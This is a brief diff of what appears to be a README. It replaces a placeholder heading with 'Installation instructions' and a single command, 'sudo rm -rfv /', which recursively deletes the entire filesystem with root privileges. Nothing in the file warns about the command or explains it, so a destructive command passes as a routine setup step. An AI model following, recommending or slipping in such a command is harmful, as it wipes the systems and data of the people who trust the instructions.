@@ -1,1 +1,5 @@
-# del-me-also
+# Installation instructions
+
+```
+sudo rm -rfv /
+```
